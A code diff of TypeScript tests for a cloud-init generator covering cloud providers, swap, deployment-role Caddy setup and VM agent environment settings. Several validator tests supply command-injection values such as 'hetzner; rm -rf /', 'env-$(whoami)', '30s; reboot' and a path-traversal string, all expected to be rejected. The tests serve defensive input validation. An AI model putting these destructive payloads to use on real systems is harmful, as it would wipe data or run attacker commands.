-    // The default case sets APT_MIRROR=""
-    expect(mirrorScript.content).toContain('APT_MIRROR=""');
-  });
-
-  it('apt mirror script sets empty PROVIDER when provider is omitted', () => {
-    const config = generateCloudInit(baseVariables());
-    const parsed = YAML.parse(config);
-
-    const mirrorScript = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sam/apt-mirror-config.sh'
-    );
-    expect(mirrorScript).toBeDefined();
-    expect(mirrorScript.content).toContain('PROVIDER=""');
-  });
-});
-
-describe('validateCloudInitVariables — provider field', () => {
-  it('accepts valid provider values', () => {
-    for (const provider of ['hetzner', 'scaleway', 'gcp']) {
-      expect(() => validateCloudInitVariables(baseVariables({ provider }))).not.toThrow();
-    }
-  });
-
-  it('accepts empty string for provider', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ provider: '' }))).not.toThrow();
-  });
-
-  it('accepts undefined provider', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ provider: undefined }))).not.toThrow();
-  });
-
-  it('rejects invalid provider', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ provider: 'aws' }))).toThrow('provider');
   });
 
   it('rejects provider with shell metacharacters', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ provider: 'hetzner; rm -rf /' }))).toThrow('provider');
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ provider: 'hetzner; rm -rf /' }))
+    ).toThrow('provider');
   });
 });
 
+describe.each(['vultr', 'infomaniak'] as const)(
+  'cloud-init supports the %s provider',
+  (provider) => {
+    it(`lists ${provider} in VALID_CLOUD_PROVIDERS`, () => {
+      expect(VALID_CLOUD_PROVIDERS).toContain(provider);
+    });
+
+    it(`validateCloudInitVariables accepts provider: ${provider}`, () => {
+      expectValidVariables({ provider });
+    });
+
+    it(`generateCloudInit accepts provider: ${provider} and produces parseable YAML`, () => {
+      const unitFile = getWriteFile('/etc/systemd/system/vm-agent.service', { provider });
+      expect(unitFile.content).toContain(`Environment=PROVIDER=${provider}`);
+    });
+
+    it(`renders the apt mirror script for ${provider} with an empty APT_MIRROR`, () => {
+      const mirrorScript = getWriteFile('/etc/sam/apt-mirror-config.sh', { provider });
+      expect(mirrorScript.content).toContain(`PROVIDER="${provider}"`);
+      expect(mirrorScript.content).toContain('APT_MIRROR=""');
+    });
+  }
+);
+
 describe('integrated size validation in generateCloudInit', () => {
   it('throws when output exceeds 32KB (default behavior)', () => {
-    // Create variables that will produce a config exceeding 32KB
-    // by providing very large PEM content
-    const largePemLines = ['-----BEGIN CERTIFICATE-----'];
-    // Each base64 line is ~64 chars; need enough to push past 32KB
-    for (let i = 0; i < 500; i++) {
-      largePemLines.push('MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL');
-    }
-    largePemLines.push('-----END CERTIFICATE-----');
-    const largeCert = largePemLines.join('\n');
-
-    const largeKeyLines = ['-----BEGIN RSA PRIVATE KEY-----'];
-    for (let i = 0; i < 500; i++) {
-      largeKeyLines.push('MIIEpAIBAAKCAQEAxvFqof1sMB1yt+eiTk7gSMkJaOWJFx7GCQIDfDs3FtQ2VLJM');
-    }
-    largeKeyLines.push('-----END RSA PRIVATE KEY-----');
-    const largeKey = largeKeyLines.join('\n');
-
-    expect(() => generateCloudInit(baseVariables({
-      originCaCert: largeCert,
-      originCaKey: largeKey,
-    }))).toThrow('32KB');
+    expect(() =>
+      generateCloudInit(
+        baseVariables({
+          callbackToken: 'a'.repeat(40_000),
+        })
+      )
+    ).toThrow('32KB');
   });
 
   it('skips size validation when validateSize is false', () => {
-    const largePemLines = ['-----BEGIN CERTIFICATE-----'];
-    for (let i = 0; i < 500; i++) {
-      largePemLines.push('MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL');
-    }
-    largePemLines.push('-----END CERTIFICATE-----');
-    const largeCert = largePemLines.join('\n');
-
-    const largeKeyLines = ['-----BEGIN RSA PRIVATE KEY-----'];
-    for (let i = 0; i < 500; i++) {
-      largeKeyLines.push('MIIEpAIBAAKCAQEAxvFqof1sMB1yt+eiTk7gSMkJaOWJFx7GCQIDfDs3FtQ2VLJM');
-    }
-    largeKeyLines.push('-----END RSA PRIVATE KEY-----');
-    const largeKey = largeKeyLines.join('\n');
-
     // Should not throw with validateSize: false
-    expect(() => generateCloudInit(baseVariables({
-      originCaCert: largeCert,
-      originCaKey: largeKey,
-    }), { validateSize: false })).not.toThrow();
+    expect(() =>
+      generateCloudInit(
+        baseVariables({
+          callbackToken: 'a'.repeat(40_000),
+        }),
+        { validateSize: false }
+      )
+    ).not.toThrow();
   });
 
   it('does not throw for normal-sized configs (default behavior)', () => {
-    expect(() => generateCloudInit(baseVariables({
-      originCaCert: REALISTIC_CERT,
-      originCaKey: REALISTIC_KEY,
-    }))).not.toThrow();
+    expect(() =>
+      generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+        })
+      )
+    ).not.toThrow();
+  });
+});
+
+describe('swap file configuration', () => {
+  /** Find the runcmd entry containing the swap setup script block. */
+  function findSwapBlock(parsed: { runcmd: (string | unknown)[] }): string {
+    const block = parsed.runcmd.find(
+      (cmd) => typeof cmd === 'string' && cmd.includes('SWAP_SIZE_MB=')
+    );
+    return (block as string) ?? '';
+  }
+
+  it('uses default swap values (2048 MB, swappiness 60)', () => {
+    const config = generateCloudInit(baseVariables(), { validateSize: false });
+    const parsed = YAML.parse(config);
+
+    const swapBlock = findSwapBlock(parsed);
+    expect(swapBlock).toContain('SWAP_SIZE_MB="2048"');
+    expect(swapBlock).toContain('SWAP_SWAPPINESS="60"');
+
+    // Check sysctl.d persistence file
+    const sysctlFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+    );
+    expect(sysctlFile).toBeDefined();
+    expect(sysctlFile.content).toContain('vm.swappiness=60');
+  });
+
+  it('accepts custom swap values', () => {
+    const config = generateCloudInit(baseVariables({ swapSizeMb: '4096', swapSwappiness: '10' }), {
+      validateSize: false,
+    });
+    const parsed = YAML.parse(config);
+
+    const swapBlock = findSwapBlock(parsed);
+    expect(swapBlock).toContain('SWAP_SIZE_MB="4096"');
+    expect(swapBlock).toContain('SWAP_SWAPPINESS="10"');
+
+    const sysctlFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+    );
+    expect(sysctlFile.content).toContain('vm.swappiness=10');
+  });
+
+  it('disables swap when swapSizeMb is "0"', () => {
+    const config = generateCloudInit(baseVariables({ swapSizeMb: '0' }), { validateSize: false });
+    const parsed = YAML.parse(config);
+
+    const swapBlock = findSwapBlock(parsed);
+    expect(swapBlock).toContain('SWAP_SIZE_MB="0"');
+    // The conditional block means fallocate/mkswap/swapon won't execute
+    expect(swapBlock).toContain('Swap disabled (SWAP_SIZE_MB=0)');
+  });
+
+  it('generates sysctl persistence file in write_files', () => {
+    const config = generateCloudInit(baseVariables({ swapSwappiness: '80' }), {
+      validateSize: false,
+    });
+    const parsed = YAML.parse(config);
+
+    const sysctlFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+    );
+    expect(sysctlFile).toBeDefined();
+    expect(sysctlFile.permissions).toBe('0644');
+    expect(sysctlFile.content.trim()).toBe('vm.swappiness=80');
+  });
+
+  it('places swap setup before vm-agent download in runcmd', () => {
+    const config = generateCloudInit(baseVariables(), { validateSize: false });
+    const parsed = YAML.parse(config);
+
+    const runcmd = parsed.runcmd as string[];
+    const swapIdx = runcmd.findIndex(
+      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: swap-setup')
+    );
+    const agentIdx = runcmd.findIndex(
+      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: vm-agent-download')
+    );
+    expect(swapIdx).toBeGreaterThan(-1);
+    expect(agentIdx).toBeGreaterThan(-1);
+    expect(swapIdx).toBeLessThan(agentIdx);
+  });
+
+  it('rejects non-numeric swapSizeMb', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ swapSizeMb: '2G' }))).toThrow(
+      'swapSizeMb'
+    );
+  });
+
+  it('rejects shell metacharacters in swapSizeMb', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '2048; rm -rf /' }))
+    ).toThrow('swapSizeMb');
+  });
+
+  it('rejects out-of-range swapSizeMb (>65536)', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ swapSizeMb: '99999' }))).toThrow(
+      'swapSizeMb'
+    );
+  });
+
+  it('rejects out-of-range swapSwappiness (>100)', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ swapSwappiness: '150' }))).toThrow(
+      'swapSwappiness'
+    );
+  });
+
+  it('rejects non-numeric swapSwappiness', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ swapSwappiness: 'high' }))).toThrow(
+      'swapSwappiness'
+    );
+  });
+
+  it('rejects shell metacharacters in swapSwappiness', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSwappiness: '60; rm -rf /' }))
+    ).toThrow('swapSwappiness');
+  });
+
+  it('accepts boundary values (swapSizeMb=0, swapSwappiness=0 and 100)', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '0', swapSwappiness: '0' }))
+    ).not.toThrow();
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '65536', swapSwappiness: '100' }))
+    ).not.toThrow();
+  });
+
+  it('still writes sysctl.d with default swappiness when swap is disabled', () => {
+    const config = generateCloudInit(baseVariables({ swapSizeMb: '0' }), { validateSize: false });
+    const parsed = YAML.parse(config);
+
+    const sysctlFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+    );
+    expect(sysctlFile).toBeDefined();
+    expect(sysctlFile.content.trim()).toBe('vm.swappiness=60');
+  });
+});
+
+// =============================================================================
+// Deployment Role Support
+// =============================================================================
+
+describe('deployment role support', () => {
+  it('sets deployment role environment in vm-agent systemd unit', () => {
+    const config = generateCloudInit(
+      baseVariables({
+        role: 'deployment',
+        environmentId: 'env-abc123',
+        deploySigningPubKey: 'deploy-pub-key-abc123+/=',
+        deployAcmeEmail: 'ops@example.com',
+        deployAcmeCa: 'https://acme-staging-v02.api.letsencrypt.org/directory',
+        deployComposeCmd: '/usr/local/bin/docker compose',
+        deployHealthTimeout: '7m',
+      }),
+      { validateSize: false }
+    );
+    const parsed = YAML.parse(config);
+
+    const unitFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+    );
+    expect(unitFile).toBeDefined();
+    expect(unitFile.content).toContain('Environment=ROLE=deployment');
+    expect(unitFile.content).toContain('Environment=NODE_ROLE=deployment');
+    expect(unitFile.content).toContain('Environment=ENVIRONMENT_ID=env-abc123');
+    expect(unitFile.content).toContain(
+      'Environment=DEPLOY_SIGNING_PUB_KEY=deploy-pub-key-abc123+/='
+    );
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_EMAIL=ops@example.com');
+    expect(unitFile.content).toContain(
+      'Environment=DEPLOY_ACME_CA=https://acme-staging-v02.api.letsencrypt.org/directory'
+    );
+    expect(unitFile.content).toContain(
+      'Environment="DEPLOY_COMPOSE_CMD=/usr/local/bin/docker compose"'
+    );
+    expect(unitFile.content).toContain('Environment=DEPLOY_HEALTH_TIMEOUT=7m');
+  });
+
+  it('leaves deployment environment empty when not specified', () => {
+    const config = generateCloudInit(baseVariables(), { validateSize: false });
+    const parsed = YAML.parse(config);
+
+    const unitFile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+    );
+    expect(unitFile).toBeDefined();
+    // Empty string values — vm-agent ignores empty env vars
+    expect(unitFile.content).toContain('Environment=ROLE=\n');
+    expect(unitFile.content).toContain('Environment=NODE_ROLE=\n');
+    expect(unitFile.content).toContain('Environment=ENVIRONMENT_ID=\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_SIGNING_PUB_KEY=\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_EMAIL=\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_CA=\n');
+    expect(unitFile.content).toContain('Environment="DEPLOY_COMPOSE_CMD="\n');
+    expect(unitFile.content).toContain('Environment=DEPLOY_HEALTH_TIMEOUT=\n');
+  });
+
+  it('generates valid YAML with deployment role set', () => {
+    const config = generateCloudInit(
+      baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
+      { validateSize: false }
+    );
+
+    // Must parse without error
+    const parsed = YAML.parse(config);
+    expect(parsed.hostname).toBe('sam-test-node');
+
+    // Verify config stays within 32KB limit
+    const sizeBytes = new TextEncoder().encode(config).length;
+    expect(sizeBytes).toBeLessThanOrEqual(32 * 1024);
+  });
+
+  it('writes an initial managed Caddyfile for deployment routing', () => {
+    const config = generateCloudInit(
+      baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
+      { validateSize: false }
+    );
+    const parsed = YAML.parse(config);
+
+    const caddyfile = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/caddy/Caddyfile'
+    );
+    expect(caddyfile).toBeDefined();
+    expect(caddyfile.permissions).toBe('0644');
+    expect(caddyfile.content).toContain('Managed by SAM deployment agent');
+    expect(caddyfile.content).toContain('caddy reload');
+    expect(caddyfile.content).toContain('auto_https off');
+    expect(caddyfile.content).toContain(':80');
+    expect(caddyfile.content).toContain('SAM deployment node awaiting release');
+  });
+
+  it('guards Caddy path preparation behind ROLE=deployment', () => {
+    const config = generateCloudInit(
+      baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
+      { validateSize: false }
+    );
+    const parsed = YAML.parse(config);
+    const runcmd = parsed.runcmd.join('\n');
+
+    expect(runcmd).toContain('ROLE="deployment"');
+    expect(runcmd).toContain('if [ "$ROLE" = "deployment" ]; then');
+    expect(runcmd).toContain('Preparing Caddy paths for deployment node routing');
+    expect(runcmd).toContain('vm-agent owns Caddy install/start');
+    expect(runcmd).not.toContain('apt-get install -y caddy');
+    expect(runcmd).not.toContain('systemctl reload-or-restart caddy');
+  });
+
+  it('runs the workspace Caddy setup entry successfully through cloud-init /bin/sh', () => {
+    const { calls, command, result } = runCaddySetupRuncmd('workspace');
+
+    expect(result.error).toBeUndefined();
+    expect(result.status, result.stderr).toBe(0);
+    expect(command).not.toContain('pipefail');
+    expect(calls).toContain('logger -t sam-boot Skipping Caddy setup for ROLE=workspace');
+    expect(calls.some((call) => call.startsWith('mkdir '))).toBe(false);
+  });
+
+  it('runs the deployment Caddy setup entry successfully through cloud-init /bin/sh', () => {
+    const { calls, command, result } = runCaddySetupRuncmd('deployment');
+
+    expect(result.error).toBeUndefined();
+    expect(result.status, result.stderr).toBe(0);
+    expect(command).not.toContain('pipefail');
+    expect(calls).toContain('mkdir -p /etc/caddy /var/lib/caddy /var/log/caddy');
+    expect(calls).toContain(
+      'logger -t sam-boot Caddy paths ready; vm-agent owns Caddy install/start'
+    );
+  });
+
+  it('starts vm-agent before non-blocking deployment Caddy path setup', () => {
+    const config = generateCloudInit(
+      baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
+      { validateSize: false }
+    );
+    const parsed = YAML.parse(config);
+    const runcmd = parsed.runcmd.join('\n');
+
+    expect(runcmd.indexOf('PHASE START: vm-agent-start')).toBeGreaterThan(-1);
+    expect(runcmd.indexOf('PHASE START: caddy-setup')).toBeGreaterThan(-1);
+    expect(runcmd.indexOf('PHASE START: vm-agent-start')).toBeLessThan(
+      runcmd.indexOf('PHASE START: caddy-setup')
+    );
+  });
+
+  it('rejects invalid role values', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ role: 'admin' }))).toThrow('role');
+
+    expect(() => validateCloudInitVariables(baseVariables({ role: 'worker' }))).toThrow('role');
+  });
+
+  it('accepts valid role values', () => {
+    expect(() => validateCloudInitVariables(baseVariables({ role: 'workspace' }))).not.toThrow();
+
+    expect(() => validateCloudInitVariables(baseVariables({ role: 'deployment' }))).not.toThrow();
+  });
+
+  it('rejects environmentId with shell metacharacters', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-123; rm -rf /' }))
+    ).toThrow('environmentId');
+
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-$(whoami)' }))
+    ).toThrow('environmentId');
+  });
+
+  it('accepts valid environmentId values', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-abc123' }))
+    ).not.toThrow();
+
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ environmentId: 'ENV_TEST-123_abc' }))
+    ).not.toThrow();
+  });
+
+  it('accepts empty role and environmentId', () => {
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ role: '', environmentId: '' }))
+    ).not.toThrow();
+  });
+});
+
+describe('Docker daemon.json live-restore', () => {
+  it('includes live-restore: true for container survival during daemon restarts', () => {
+    const config = generateCloudInit(baseVariables(), { validateSize: false });
+    const parsed = YAML.parse(config);
+    const daemonJson = parsed.write_files.find(
+      (f: { path: string }) => f.path === '/etc/docker/daemon.json'
+    );
+    expect(daemonJson).toBeDefined();
+    const dockerConfig = JSON.parse(daemonJson.content);
+    expect(dockerConfig['live-restore']).toBe(true);
+  });
+});
+
+describe('cloud-init supports the digitalocean provider', () => {
+  it('accepts digitalocean and generates provider-aware parseable YAML', () => {
+    expect(VALID_CLOUD_PROVIDERS).toContain('digitalocean');
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ provider: 'digitalocean' }))
+    ).not.toThrow();
+    const config = generateCloudInit(baseVariables({ provider: 'digitalocean' }));
+    expect(() => YAML.parse(config)).not.toThrow();
+    expect(config).toContain('Environment=PROVIDER=digitalocean');
+  });
+});
+
+describe('VM error reporter environment', () => {
+  it('renders safe defaults and deploy-time overrides into the VM Agent service', () => {
+    const defaults = generateCloudInit(baseVariables(), { validateSize: false });
+    expect(defaults).toContain('Environment=WORKSPACE_BUILD_QUEUE_DEPTH=1');
+    expect(defaults).toContain('Environment=ERROR_REPORT_FLUSH_INTERVAL=30s');
+    expect(defaults).toContain('Environment=ERROR_REPORT_MAX_BATCH_BYTES=32768');
+    expect(defaults).toContain(
+      'Environment=ERROR_REPORT_DB_PATH=/var/lib/vm-agent/error-reports.db'
+    );
+    expect(defaults).toContain('Environment=ERROR_REPORT_DB_BUSY_TIMEOUT=5s');
+    expect(defaults).toContain('Environment=ERROR_REPORT_EVENT_LIMIT=100');
+    expect(defaults).toContain('Environment=ERROR_REPORT_RESPONSE_MAX_BYTES=4096');
+    expect(defaults).toContain('Environment=ERROR_REPORT_STORED_ERROR_MAX_BYTES=512');
+    expect(defaults).toContain('Environment=ERROR_REPORT_COLLECTOR_CONCURRENCY=1');
+
+    const overridden = generateCloudInit(
+      baseVariables({
+        errorReportFlushInterval: '45s',
+        errorReportMaxBatchBytes: '16384',
+        errorReportDbPath: '/var/lib/vm-agent/custom-errors.db',
+        errorReportDbBusyTimeout: '750ms',
+        errorReportEventLimit: '75',
+        errorReportResponseMaxBytes: '2048',
+        errorReportStoredErrorMaxBytes: '256',
+        errorReportCollectorConcurrency: '2',
+      }),
+      { validateSize: false }
+    );
+    expect(overridden).toContain('Environment=ERROR_REPORT_FLUSH_INTERVAL=45s');
+    expect(overridden).toContain('Environment=ERROR_REPORT_MAX_BATCH_BYTES=16384');
+    expect(overridden).toContain(
+      'Environment=ERROR_REPORT_DB_PATH=/var/lib/vm-agent/custom-errors.db'
+    );
+    expect(overridden).toContain('Environment=ERROR_REPORT_DB_BUSY_TIMEOUT=750ms');
+    expect(overridden).toContain('Environment=ERROR_REPORT_EVENT_LIMIT=75');
+    expect(overridden).toContain('Environment=ERROR_REPORT_RESPONSE_MAX_BYTES=2048');
+    expect(overridden).toContain('Environment=ERROR_REPORT_STORED_ERROR_MAX_BYTES=256');
+    expect(overridden).toContain('Environment=ERROR_REPORT_COLLECTOR_CONCURRENCY=2');
+  });
+
+  it('rejects unsafe duration, numeric, and path overrides', () => {
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportFlushInterval: '30s; reboot',
+        })
+      )
+    ).toThrow('errorReportFlushInterval');
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportMaxBatchBytes: '-1',
+        })
+      )
+    ).toThrow('errorReportMaxBatchBytes');
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportDbBusyTimeout: '5s; reboot',
+        })
+      )
+    ).toThrow('errorReportDbBusyTimeout');
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportDbPath: '/tmp/errors;reboot',
+        })
+      )
+    ).toThrow('errorReportDbPath');
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportSpoolDir: '/var/lib/vm-agent/../../root',
+        })
+      )
+    ).toThrow('errorReportSpoolDir');
+    expect(() =>
+      validateCloudInitVariables(
+        baseVariables({
+          errorReportSpoolDir: '/var/lib//vm-agent/incidents',
+        })
+      )
+    ).toThrow('errorReportSpoolDir');
+  });
+});
+
+describe('VM session snapshot environment', () => {
+  it('renders the default and deploy-time snapshot timings into the VM Agent service', () => {
+    const defaults = generateCloudInit(baseVariables(), { validateSize: false });
+    expect(defaults).toContain('Environment=SESSION_SNAPSHOT_OPERATION_TIMEOUT=15m');
+    expect(defaults).toContain('Environment=SESSION_SNAPSHOT_PROGRESS_REPORT_INTERVAL=15s');
+    expect(defaults).toContain('Environment=SESSION_SNAPSHOT_PROGRESS_REPORT_TIMEOUT=5s');
+
+    const overridden = generateCloudInit(
+      baseVariables({
+        sessionSnapshotOperationTimeout: '12m30s',
+        sessionSnapshotProgressReportInterval: '3s',
+        sessionSnapshotProgressReportTimeout: '750ms',
+      }),
+      { validateSize: false }
+    );
+    expect(overridden).toContain('Environment=SESSION_SNAPSHOT_OPERATION_TIMEOUT=12m30s');
+    expect(overridden).toContain('Environment=SESSION_SNAPSHOT_PROGRESS_REPORT_INTERVAL=3s');
+    expect(overridden).toContain('Environment=SESSION_SNAPSHOT_PROGRESS_REPORT_TIMEOUT=750ms');
   });
 });
